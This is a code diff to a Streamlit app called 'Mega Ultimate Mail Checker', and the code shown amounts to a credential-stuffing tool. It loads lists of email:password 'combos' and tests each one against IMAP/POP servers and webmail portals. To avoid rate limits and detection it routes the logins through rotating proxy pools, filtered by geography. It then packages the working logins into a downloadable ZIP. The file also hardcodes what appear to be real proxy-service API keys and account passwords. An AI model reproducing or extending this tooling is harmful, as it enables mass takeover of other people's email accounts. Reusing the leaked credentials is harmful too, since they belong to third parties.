@@ -1,4 +1,4 @@
-import streamlit as st
+import streamlit as str_lit
 import asyncio
 import imaplib
 import poplib
@@ -27,6 +27,8 @@ except ImportError:
 
 try:
     import requests
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 except ImportError:
     requests = None
 
@@ -40,14 +42,14 @@ warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 socket.setdefaulttimeout(4.0)
 
 # --- Page Config ---
-st.set_page_config(
+str_lit.set_page_config(
     page_title="Mega Ultimate Mail Checker",
     page_icon="⚡",
     layout="wide"
 )
 
 # --- Custom CSS for Styling ---
-st.markdown("""
+str_lit.markdown("""
 <style>
     .stSlider input[type=range] {
         accent-color: #ff4b4b;
@@ -65,30 +67,30 @@ st.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-st.title("⚡ Mega Ultimate Mail Checker v10 (Full Colab-Parity Edition)")
-st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with advanced proxy modes, geo-filtering, webmail portal checks, and automated ZIP archiving.")
+str_lit.title("⚡ Mega Ultimate Mail Checker v10 (Full Colab-Parity Edition)")
+str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with advanced proxy modes, geo-filtering, webmail portal checks, and automated ZIP archiving.")
 
 # --- Persistent Session State Initialization ---
-if "engine_has_run" not in st.session_state:
-    st.session_state.engine_has_run = False
-if "valid_results" not in st.session_state:
-    st.session_state.valid_results = []
-if "wrong_results" not in st.session_state:
-    st.session_state.wrong_results = []
-if "need_app_results" not in st.session_state:
-    st.session_state.need_app_results = []
-if "conn_results" not in st.session_state:
-    st.session_state.conn_results = []
-if "report_entries" not in st.session_state:
-    st.session_state.report_entries = []
-if "log_lines" not in st.session_state:
-    st.session_state.log_lines = []
-if "zip_bytes" not in st.session_state:
-    st.session_state.zip_bytes = None
-if "zip_name" not in st.session_state:
-    st.session_state.zip_name = ""
-if "clean_valid_count" not in st.session_state:
-    st.session_state.clean_valid_count = 0
+if "engine_has_run" not in str_lit.session_state:
+    str_lit.session_state.engine_has_run = False
+if "valid_results" not in str_lit.session_state:
+    str_lit.session_state.valid_results = []
+if "wrong_results" not in str_lit.session_state:
+    str_lit.session_state.wrong_results = []
+if "need_app_results" not in str_lit.session_state:
+    str_lit.session_state.need_app_results = []
+if "conn_results" not in str_lit.session_state:
+    str_lit.session_state.conn_results = []
+if "report_entries" not in str_lit.session_state:
+    str_lit.session_state.report_entries = []
+if "log_lines" not in str_lit.session_state:
+    str_lit.session_state.log_lines = []
+if "zip_bytes" not in str_lit.session_state:
+    str_lit.session_state.zip_bytes = None
+if "zip_name" not in str_lit.session_state:
+    str_lit.session_state.zip_name = ""
+if "clean_valid_count" not in str_lit.session_state:
+    str_lit.session_state.clean_valid_count = 0
 
 # --- State Management & Thread Locks ---
 cache_lock = threading.Lock()
@@ -112,7 +114,7 @@ _default_webshare = [
     "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3"
 ]
 
-_raw_webshare_sec = st.secrets.get("WEBSHARE_KEYS", _default_webshare)
+_raw_webshare_sec = str_lit.secrets.get("WEBSHARE_KEYS", _default_webshare)
 if isinstance(_raw_webshare_sec, str):
     WEBSHARE_KEYS = []
     for chunk in _raw_webshare_sec.replace("\n", ",").split(","):
@@ -128,7 +130,7 @@ _default_oxylabs = [
     "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",
     "user-Positivekenny_ls8CB-country-US:Adejoke52_52@dc.oxylabs.io:8000"
 ]
-_raw_oxylabs_sec = st.secrets.get("OXYLABS_BASE", _default_oxylabs)
+_raw_oxylabs_sec = str_lit.secrets.get("OXYLABS_BASE", _default_oxylabs)
 if isinstance(_raw_oxylabs_sec, str):
     OXYLABS_PROXIES = [line.strip() for line in _raw_oxylabs_sec.splitlines() if line.strip()]
 elif isinstance(_raw_oxylabs_sec, list):
@@ -136,54 +138,54 @@ elif isinstance(_raw_oxylabs_sec, list):
 else:
     OXYLABS_PROXIES = []
 
-if "help_states" not in st.session_state:
-    st.session_state.help_states = {}
+if "help_states" not in str_lit.session_state:
+    str_lit.session_state.help_states = {}
 
 def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
-    if key_name not in st.session_state.help_states:
-        st.session_state.help_states[key_name] = {"visible": False, "time": 0}
+    if key_name not in str_lit.session_state.help_states:
+        str_lit.session_state.help_states[key_name] = {"visible": False, "time": 0}
     
-    state_data = st.session_state.help_states[key_name]
+    state_data = str_lit.session_state.help_states[key_name]
     if state_data.get("visible", False):
         if time.time() - state_data.get("time", 0) > 10.0:
-            st.session_state.help_states[key_name]["visible"] = False
+            str_lit.session_state.help_states[key_name]["visible"] = False
 
-    col_lbl, col_btn = st.sidebar.columns([0.85, 0.15])
+    col_lbl, col_btn = str_lit.sidebar.columns([0.85, 0.15])
     val = None
     with col_lbl:
         if widget_type == "label":
-            st.markdown(f"**{label_text}**")
+            str_lit.markdown(f"**{label_text}**")
         elif widget_type == "checkbox":
-            val = st.checkbox(label_text, value=kwargs.get("value", False), key=f"chk_{key_name}")
+            val = str_lit.checkbox(label_text, value=kwargs.get("value", False), key=f"chk_{key_name}")
         elif widget_type in ["text", "selectbox"]:
-            st.markdown(f"**{label_text}**")
+            str_lit.markdown(f"**{label_text}**")
 
     with col_btn:
-        if st.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
-            current = st.session_state.help_states[key_name]["visible"]
-            st.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
+        if str_lit.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
+            current = str_lit.session_state.help_states[key_name]["visible"]
+            str_lit.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
 
-    if st.session_state.help_states[key_name]["visible"]:
-        st.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)
+    if str_lit.session_state.help_states[key_name]["visible"]:
+        str_lit.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)
 
     if widget_type == "checkbox":
         return val
     return None
 
 # --- Sidebar Control Panel ---
-st.sidebar.header("⚙️ Engine Control Panel")
+str_lit.sidebar.header("⚙️ Engine Control Panel")
 
-workers = st.sidebar.slider("Workers Start", min_value=1, max_value=50, value=10, step=1)
-deadline = st.sidebar.slider("Deadline (Seconds)", min_value=5, max_value=120, value=25, step=5)
-max_acc = st.sidebar.slider("Max Accounts", min_value=0, max_value=5000, value=5000, step=100)
-timeout = st.sidebar.slider("Timeout", min_value=2, max_value=30, value=10, step=1)
-blacklist_cf = st.sidebar.slider("Blacklist CF", min_value=0, max_value=500, value=100, step=10)
+workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=50, value=10, step=1)
+deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=5, max_value=120, value=25, step=5)
+max_acc = str_lit.sidebar.slider("Max Accounts", min_value=0, max_value=5000, value=5000, step=100)
+timeout = str_lit.sidebar.slider("Timeout", min_value=2, max_value=30, value=10, step=1)
+blacklist_cf = str_lit.sidebar.slider("Blacklist CF", min_value=0, max_value=500, value=100, step=10)
 
-st.sidebar.markdown("---")
-st.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
+str_lit.sidebar.markdown("---")
+str_lit.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
 
-min_proxy_score = st.sidebar.slider("Min Proxy Score", min_value=0, max_value=100, value=40, step=5)
-pool_mode = st.sidebar.selectbox("Pool Mode", options=["all", "us_only", "country", "mix"], index=0)
+min_proxy_score = str_lit.sidebar.slider("Min Proxy Score", min_value=0, max_value=100, value=40, step=5)
+pool_mode = str_lit.sidebar.selectbox("Pool Mode", options=["all", "us_only", "country", "mix"], index=0)
 
 def load_json(path, default=None):
     if default is None: default = {}
@@ -214,7 +216,8 @@ def load_webshare(key):
     url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=250"
     headers = {"Authorization": f"Token {key}"}
     try:
-        response = requests.get(url, headers=headers, timeout=10)
+        # Added a strict timeout so it never hangs indefinitely
+        response = requests.get(url, headers=headers, timeout=5)
         if response.status_code == 200:
             data = response.json()
             proxies = []
@@ -373,36 +376,36 @@ selected_countries = []
 selected_mix_countries = []
 
 if pool_mode == "country":
-    st.sidebar.markdown("#### Select Countries")
+    str_lit.sidebar.markdown("#### Select Countries")
     available_countries = get_available_countries_with_scores()
     if not available_countries:
         available_countries = ["US", "GB", "DE", "CA", "FR"]
-    with st.sidebar.form("country_form"):
+    with str_lit.sidebar.form("country_form"):
         country_checkboxes = {}
         for c in available_countries:
-            country_checkboxes[c] = st.checkbox(c, value=(c == "US"))
-        country_done = st.form_submit_button("Done")
+            country_checkboxes[c] = str_lit.checkbox(c, value=(c == "US"))
+        country_done = str_lit.form_submit_button("Done")
         if country_done:
             selected_countries = [c for c, checked in country_checkboxes.items() if checked]
-            st.sidebar.success(f"Selected countries: {', '.join(selected_countries)}")
+            str_lit.sidebar.success(f"Selected countries: {', '.join(selected_countries)}")
 
 elif pool_mode == "mix":
-    st.sidebar.markdown("#### Select Mix Countries (Ranked by Score)")
+    str_lit.sidebar.markdown("#### Select Mix Countries (Ranked by Score)")
     available_countries = get_available_countries_with_scores()
     if not available_countries:
         available_countries = ["US", "GB", "DE", "CA", "FR"]
-    with st.sidebar.form("mix_form"):
+    with str_lit.sidebar.form("mix_form"):
         mix_checkboxes = {}
         for c in available_countries:
             scores_for_c = [proxy_meta.get(p, {}).get("score", 50) for p in load_proxies() if proxy_meta.get(p, {}).get("country", "").upper() == c]
             avg_s = int(sum(scores_for_c) / len(scores_for_c)) if scores_for_c else 50
-            mix_checkboxes[c] = st.checkbox(f"{c} (Avg Score: {avg_s})", value=True)
-        mix_done = st.form_submit_button("Done")
+            mix_checkboxes[c] = str_lit.checkbox(f"{c} (Avg Score: {avg_s})", value=True)
+        mix_done = str_lit.form_submit_button("Done")
         if mix_done:
             selected_mix_countries = [c.split(" ")[0] for c, checked in mix_checkboxes.items() if checked]
-            st.sidebar.success(f"Selected mix pool: {', '.join(selected_mix_countries)}")
+            str_lit.sidebar.success(f"Selected mix pool: {', '.join(selected_mix_countries)}")
 
-st.sidebar.markdown("---")
+str_lit.sidebar.markdown("---")
 
 secret_portals = instant_help("secret_portals", "Enable automatic discovery routes for non-standard provider ports and webmail HTTP portals.", "Secret Portals", widget_type="checkbox", value=True)
 use_proxy = instant_help("use_proxy", "Route all checker requests through proxy nodes to prevent IP rate-limiting.", "Use Proxy", widget_type="checkbox", value=True)
@@ -412,14 +415,14 @@ proxy_test_flight = instant_help("proxy_test_flight", "Perform an initial health
 skip_app = instant_help("skip_app", "Filter out accounts requiring explicit app passwords or token generation upfront.", "Skip Strict App-Only Providers", widget_type="checkbox", value=True)
 debug_mode = instant_help("debug_mode", "Stream verbose logs and error tracing directly into the UI interface.", "Enable Debug Mode", widget_type="checkbox", value=True)
 
-resolved_proxy_mode = st.sidebar.selectbox(
+resolved_proxy_mode = str_lit.sidebar.selectbox(
     "Proxy Mode Engine:",
     options=["aggressive", "fallback", "sticky", "off"],
     index=1
 )
 
-if st.sidebar.button("💾 Apply Settings", type="primary"):
-    st.sidebar.success("Settings applied successfully!")
+if str_lit.sidebar.button("💾 Apply Settings", type="primary"):
+    str_lit.sidebar.success("Settings applied successfully!")
 
 CFG = {
     "MAX_WORKERS_START": workers,
@@ -513,14 +516,14 @@ if not proxy_meta and CFG.get("PROXY_TEST_FLIGHT", True) and requests:
 all_proxies = load_proxies()
 filtered_pool = get_filtered_active_proxies()
 
-with st.sidebar:
-    st.markdown("---")
-    st.markdown("### 🌐 Proxy Management & Health")
-    st.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}**")
+with str_lit.sidebar:
+    str_lit.markdown("---")
+    str_lit.markdown("### 🌐 Proxy Management & Health")
+    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}**")
     
-    with st.expander("➕ Add Custom Proxies", expanded=False):
-        custom_proxy_text = st.text_area("Paste proxies (host:port or user:pass@host:port)", placeholder="123.45.67.89:8080", height=100)
-        if st.button("Save Custom Proxies"):
+    with str_lit.expander("➕ Add Custom Proxies", expanded=False):
+        custom_proxy_text = str_lit.text_area("Paste proxies (host:port or user:pass@host:port)", placeholder="123.45.67.89:8080", height=100)
+        if str_lit.button("Save Custom Proxies"):
             if custom_proxy_text.strip():
                 try:
                     new_proxies = [l.strip() for l in custom_proxy_text.splitlines() if l.strip() and not l.startswith("#")]
@@ -529,16 +532,16 @@ with st.sidebar:
                     with file_write_lock:
                         with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                             f.write("\n".join(combined) + "\n")
-                    st.success(f"Added {len(new_proxies)} custom proxies successfully!")
-                    st.rerun()
+                    str_lit.success(f"Added {len(new_proxies)} custom proxies successfully!")
+                    str_lit.rerun()
                 except Exception as ex:
-                    st.error(f"Error saving custom proxies: {ex}")
+                    str_lit.error(f"Error saving custom proxies: {ex}")
     
-    if st.button("📥 Fetch & Test All Proxies"):
+    if str_lit.button("📥 Fetch & Test All Proxies"):
         if requests is None:
-            st.error("Missing 'requests' library.")
+            str_lit.error("Missing 'requests' library.")
         else:
-            with st.spinner("Fetching from Webshare & Oxylabs..."):
+            with str_lit.spinner("Fetching from Webshare & Oxylabs..."):
                 all_raw = []
                 for key in WEBSHARE_KEYS:
                     all_raw.extend(load_webshare(key))
@@ -558,19 +561,19 @@ with st.sidebar:
                             except Exception:
                                 continue
                 except Exception as ex:
-                    st.error(f"Proxy thread pool error: {ex}")
+                    str_lit.error(f"Proxy thread pool error: {ex}")
                     
                 try:
                     with file_write_lock:
                         with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                             f.write("\n".join(str(item) for item in alive) + ("\n" if alive else ""))
                 except Exception as ex:
-                    st.error(f"Failed to write proxies file: {ex}")
+                    str_lit.error(f"Failed to write proxies file: {ex}")
 
-            st.success(f"Success! Saved {len(alive)} operational proxies.")
-            st.rerun()
+            str_lit.success(f"Success! Saved {len(alive)} operational proxies.")
+            str_lit.rerun()
 
-    with st.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
+    with str_lit.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
         if proxy_meta and requests:
             updated_any = False
             for p_str, meta in proxy_meta.items():
@@ -608,23 +611,23 @@ with st.sidebar:
                     "Successes": meta.get("success", 0)
                 })
             df_proxies = pd.DataFrame(proxy_data_list)
-            st.dataframe(df_proxies, use_container_width=True)
+            str_lit.dataframe(df_proxies, use_container_width=True)
             
-            col_ref1, col_ref2 = st.columns(2)
+            col_ref1, col_ref2 = str_lit.columns(2)
             with col_ref1:
-                if st.button("🔄 Refresh Dashboard"):
-                    st.rerun()
+                if str_lit.button("🔄 Refresh Dashboard"):
+                    str_lit.rerun()
             with col_ref2:
-                if st.button("🧹 Clean Dead / Low-Score"):
+                if str_lit.button("🧹 Clean Dead / Low-Score"):
                     with proxy_lock:
                         for k, m in list(proxy_meta.items()):
                             if m.get("score", 50) < 20 or m.get("fails", 0) >= 5:
                                 proxy_meta.pop(k, None)
                     save_proxy_meta()
-                    st.success("Cleaned!")
-                    st.rerun()
+                    str_lit.success("Cleaned!")
+                    str_lit.rerun()
         else:
-            st.info("No proxy metadata recorded yet.")
+            str_lit.info("No proxy metadata recorded yet.")
 
 # --- Pre-filter Engine ---
 DISPOSABLE = {
@@ -733,21 +736,21 @@ def process_accounts(text, previous_valid):
     return clean, skipped_disp, skipped_typo, skipped_resume, skipped_app_skip, skipped_bad
 
 # --- Main Input Section ---
-st.markdown("---")
-st.markdown("### 📥 Accounts Input & Pre-Filtering")
+str_lit.markdown("---")
+str_lit.markdown("### 📥 Accounts Input & Pre-Filtering")
 
-input_tab1, input_tab2 = st.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
+input_tab1, input_tab2 = str_lit.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
 raw_text = ""
 
 with input_tab1:
-    raw_text = st.text_area(
+    raw_text = str_lit.text_area(
         "Paste accounts here (email:password format):",
         placeholder="user@example.com:password123",
         height=150
     )
 
 with input_tab2:
-    uploaded_file = st.file_uploader("Upload .txt combo file", type=["txt"])
+    uploaded_file = str_lit.file_uploader("Upload .txt combo file", type=["txt"])
     if uploaded_file is not None:
         try:
             raw_text = uploaded_file.getvalue().decode("utf-8", errors="ignore")
@@ -756,14 +759,14 @@ with input_tab2:
                 raw_text = uploaded_file.getvalue().decode("latin-1", errors="ignore")
             except Exception:
                 raw_text = ""
-        st.success("File uploaded successfully!")
+        str_lit.success("File uploaded successfully!")
 
 clean_lines = []
 if raw_text:
     previous_valid = load_previous_valid()
     clean_lines, disp, typo, resume, app_skip, bad = process_accounts(raw_text, previous_valid)
     
-    col_m1, col_m2, col_m3, col_m4, col_m5 = st.columns(5)
+    col_m1, col_m2, col_m3, col_m4, col_m5 = str_lit.columns(5)
     col_m1.metric("Ready to Check", len(clean_lines))
     col_m2.metric("Disposables Dropped", disp)
     col_m3.metric("Typos Dropped", typo)
@@ -1091,34 +1094,34 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
     return None, "connection_failed", "all hosts failed", None, trace_logs
 
 # --- Execution Trigger & Persistent UI Display ---
-st.markdown("---")
-st.markdown("### 🚀 Execute Live Checking Engine")
+str_lit.markdown("---")
+str_lit.markdown("### 🚀 Execute Live Checking Engine")
 
-if st.button("🔥 Start Live Checking Engine", type="primary"):
+if str_lit.button("🔥 Start Live Checking Engine", type="primary"):
     if not clean_lines:
-        st.warning("⚠️ Please load and filter accounts first.")
+        str_lit.warning("⚠️ Please load and filter accounts first.")
     else:
         active_proxy_pool = get_filtered_active_proxies()
         
-        st.session_state.valid_results = []
-        st.session_state.wrong_results = []
-        st.session_state.need_app_results = []
-        st.session_state.conn_results = []
-        st.session_state.report_entries = []
-        st.session_state.log_lines = []
-        st.session_state.engine_has_run = True
+        str_lit.session_state.valid_results = []
+        str_lit.session_state.wrong_results = []
+        str_lit.session_state.need_app_results = []
+        str_lit.session_state.conn_results = []
+        str_lit.session_state.report_entries = []
+        str_lit.session_state.log_lines = []
+        str_lit.session_state.engine_has_run = True
         
-        progress_bar = st.progress(0)
-        status_text = st.empty()
+        progress_bar = str_lit.progress(0)
+        status_text = str_lit.empty()
         
-        exec_tab1, exec_tab2 = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
+        exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
         
         with exec_tab1:
-            log_container = st.empty()
+            log_container = str_lit.empty()
         
         with exec_tab2:
-            report_metrics_placeholder = st.empty()
-            report_log_container = st.empty()
+            report_metrics_placeholder = str_lit.empty()
+            report_log_container = str_lit.empty()
 
         accounts_to_check = clean_lines[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else clean_lines
         total_accs = len(accounts_to_check)
@@ -1156,23 +1159,23 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
                         if res:
                             st_val = res["status"]
                             if st_val == "valid":
-                                st.session_state.valid_results.append(res["line"])
+                                str_lit.session_state.valid_results.append(res["line"])
                             elif st_val == "wrong_password":
-                                st.session_state.wrong_results.append(res["line"])
+                                str_lit.session_state.wrong_results.append(res["line"])
                             elif st_val == "need_app_password":
-                                st.session_state.need_app_results.append(res["line"])
+                                str_lit.session_state.need_app_results.append(res["line"])
                             else:
-                                st.session_state.conn_results.append(res["line"])
+                                str_lit.session_state.conn_results.append(res["line"])
                             
                             log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
-                            st.session_state.log_lines.append(log_msg)
-                            if len(st.session_state.log_lines) > 50:
-                                st.session_state.log_lines.pop(0)
-                            log_container.code("\n".join(st.session_state.log_lines), language="text")
+                            str_lit.session_state.log_lines.append(log_msg)
+                            if len(str_lit.session_state.log_lines) > 50:
+                                str_lit.session_state.log_lines.pop(0)
+                            log_container.code("\n".join(str_lit.session_state.log_lines), language="text")
 
                             trace_text = "\n  ↳ ".join(res.get("trace", ["No trace recorded"]))
                             cred_combo = f"{res.get('email', '')}:{res.get('password', '')}" if res.get('password') else res.get('email', '')
-                            st.session_state.report_entries.append({
+                            str_lit.session_state.report_entries.append({
                                 "Time": datetime.now().strftime("%H:%M:%S"),
                                 "Email:Password": cred_combo,
                                 "Status": st_val.upper(),
@@ -1180,26 +1183,26 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
                             })
                             
                             with report_metrics_placeholder.container():
-                                r_col1, r_col2, r_col3, r_col4 = st.columns(4)
-                                r_col1.metric("✅ Valid", len(st.session_state.valid_results))
-                                r_col2.metric("❌ Wrong", len(st.session_state.wrong_results))
-                                r_col3.metric("🔑 AppPass", len(st.session_state.need_app_results))
-                                r_col4.metric("⚠️ Failed", len(st.session_state.conn_results))
+                                r_col1, r_col2, r_col3, r_col4 = str_lit.columns(4)
+                                r_col1.metric("✅ Valid", len(str_lit.session_state.valid_results))
+                                r_col2.metric("❌ Wrong", len(str_lit.session_state.wrong_results))
+                                r_col3.metric("🔑 AppPass", len(str_lit.session_state.need_app_results))
+                                r_col4.metric("⚠️ Failed", len(str_lit.session_state.conn_results))
 
-                            df_report = pd.DataFrame(st.session_state.report_entries[::-1])
+                            df_report = pd.DataFrame(str_lit.session_state.report_entries[::-1])
                             report_log_container.dataframe(df_report, use_container_width=True, height=300)
                             
                     except Exception as ex:
                         err_msg = f"[EXCEPTION] {str(ex)}"
-                        st.session_state.conn_results.append(err_msg)
-                        st.session_state.log_lines.append(err_msg)
-                        log_container.code("\n".join(st.session_state.log_lines), language="text")
+                        str_lit.session_state.conn_results.append(err_msg)
+                        str_lit.session_state.log_lines.append(err_msg)
+                        log_container.code("\n".join(str_lit.session_state.log_lines), language="text")
                     
                     if total_accs > 0:
                         progress_bar.progress(min(1.0, checked_count / total_accs))
-                    status_text.text(f"Checking... {checked_count}/{total_accs} | Valid: {len(st.session_state.valid_results)} | Wrong: {len(st.session_state.wrong_results)}")
+                    status_text.text(f"Checking... {checked_count}/{total_accs} | Valid: {len(str_lit.session_state.valid_results)} | Wrong: {len(str_lit.session_state.wrong_results)}")
         except Exception as ex:
-            st.error(f"Execution thread block error: {ex}")
+            str_lit.error(f"Execution thread block error: {ex}")
 
         progress_bar.empty()
         status_text.success("🎉 Check Complete!")
@@ -1213,31 +1216,31 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
 
             with file_write_lock:
                 with open(valid_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in st.session_state.valid_results) + ("\n" if st.session_state.valid_results else ""))
+                    f.write("\n".join(str(item) for item in str_lit.session_state.valid_results) + ("\n" if str_lit.session_state.valid_results else ""))
                 with open(wrong_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in st.session_state.wrong_results) + ("\n" if st.session_state.wrong_results else ""))
+                    f.write("\n".join(str(item) for item in str_lit.session_state.wrong_results) + ("\n" if str_lit.session_state.wrong_results else ""))
                 with open(need_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in st.session_state.need_app_results) + ("\n" if st.session_state.need_app_results else ""))
+                    f.write("\n".join(str(item) for item in str_lit.session_state.need_app_results) + ("\n" if str_lit.session_state.need_app_results else ""))
                 with open(failed_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in st.session_state.conn_results) + ("\n" if st.session_state.conn_results else ""))
+                    f.write("\n".join(str(item) for item in str_lit.session_state.conn_results) + ("\n" if str_lit.session_state.conn_results else ""))
 
             clean_valid_path = "clean_valid_accounts.txt"
-            st.session_state.clean_valid_count = 0
+            str_lit.session_state.clean_valid_count = 0
             with file_write_lock:
                 with open(clean_valid_path, "w", encoding="utf-8") as outfile:
-                    for line in st.session_state.valid_results:
+                    for line in str_lit.session_state.valid_results:
                         try:
                             parts = line.split(":")
                             if len(parts) >= 2:
                                 email = parts[0].strip()
                                 password_part = parts[1].split("|")[0].strip()
                                 outfile.write(f"{email}:{password_part}\n")
-                                st.session_state.clean_valid_count += 1
+                                str_lit.session_state.clean_valid_count += 1
                         except Exception:
                             continue
 
-            st.session_state.zip_name = f"mail_results_{stamp}.zip"
-            with zipfile.ZipFile(st.session_state.zip_name, "w", zipfile.ZIP_DEFLATED) as z:
+            str_lit.session_state.zip_name = f"mail_results_{stamp}.zip"
+            with zipfile.ZipFile(str_lit.session_state.zip_name, "w", zipfile.ZIP_DEFLATED) as z:
                 if os.path.exists(clean_valid_path):
                     z.write(clean_valid_path, arcname="valid_email_password.txt")
                 if os.path.exists(wrong_path):
@@ -1247,45 +1250,45 @@ if st.button("🔥 Start Live Checking Engine", type="primary"):
                 if os.path.exists(failed_path):
                     z.write(failed_path, arcname=os.path.basename(failed_path))
 
-            with open(st.session_state.zip_name, "rb") as fp:
-                st.session_state.zip_bytes = fp.read()
+            with open(str_lit.session_state.zip_name, "rb") as fp:
+                str_lit.session_state.zip_bytes = fp.read()
 
         except Exception as ex:
-            st.error(f"Error compiling results export files: {ex}")
+            str_lit.error(f"Error compiling results export files: {ex}")
 
 # --- Render Persistent Results Permanently If Engine Has Run ---
-if st.session_state.engine_has_run:
-    st.markdown("---")
-    st.markdown("### 📊 Live Results Summary & ZIP Archive")
-    col1, col2, col3, col4 = st.columns(4)
-    col1.metric("✅ Clean Valid", st.session_state.clean_valid_count)
-    col2.metric("❌ Wrong Password", len(st.session_state.wrong_results))
-    col3.metric("🔑 App Password / 2FA", len(st.session_state.need_app_results))
-    col4.metric("⚠ Connection Failed", len(st.session_state.conn_results))
+if str_lit.session_state.engine_has_run:
+    str_lit.markdown("---")
+    str_lit.markdown("### 📊 Live Results Summary & ZIP Archive")
+    col1, col2, col3, col4 = str_lit.columns(4)
+    col1.metric("✅ Clean Valid", str_lit.session_state.clean_valid_count)
+    col2.metric("❌ Wrong Password", len(str_lit.session_state.wrong_results))
+    col3.metric("🔑 App Password / 2FA", len(str_lit.session_state.need_app_results))
+    col4.metric("⚠ Connection Failed", len(str_lit.session_state.conn_results))
     
-    if st.session_state.valid_results:
-        st.markdown("#### ✅ Valid Accounts Found:")
-        for v in st.session_state.valid_results:
-            st.code(v, language="text")
+    if str_lit.session_state.valid_results:
+        str_lit.markdown("#### ✅ Valid Accounts Found:")
+        for v in str_lit.session_state.valid_results:
+            str_lit.code(v, language="text")
 
-    exec_tab1_p, exec_tab2_p = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
+    exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
     with exec_tab1_p:
-        if st.session_state.log_lines:
-            st.code("\n".join(st.session_state.log_lines), language="text")
+        if str_lit.session_state.log_lines:
+            str_lit.code("\n".join(str_lit.session_state.log_lines), language="text")
         else:
-            st.info("No logs available from previous run.")
+            str_lit.info("No logs available from previous run.")
             
     with exec_tab2_p:
-        if st.session_state.report_entries:
-            df_report_persisted = pd.DataFrame(st.session_state.report_entries[::-1])
-            st.dataframe(df_report_persisted, use_container_width=True, height=300)
+        if str_lit.session_state.report_entries:
+            df_report_persisted = pd.DataFrame(str_lit.session_state.report_entries[::-1])
+            str_lit.dataframe(df_report_persisted, use_container_width=True, height=300)
         else:
-            st.info("No report logs available.")
+            str_lit.info("No report logs available.")
 
-    if st.session_state.zip_bytes and st.session_state.zip_name:
-        st.download_button(
+    if str_lit.session_state.zip_bytes and str_lit.session_state.zip_name:
+        str_lit.download_button(
             label="📦 Download All Results (.zip Package)",
-            data=st.session_state.zip_bytes,
-            file_name=st.session_state.zip_name,
+            data=str_lit.session_state.zip_bytes,
+            file_name=str_lit.session_state.zip_name,
             mime="application/zip"
         )
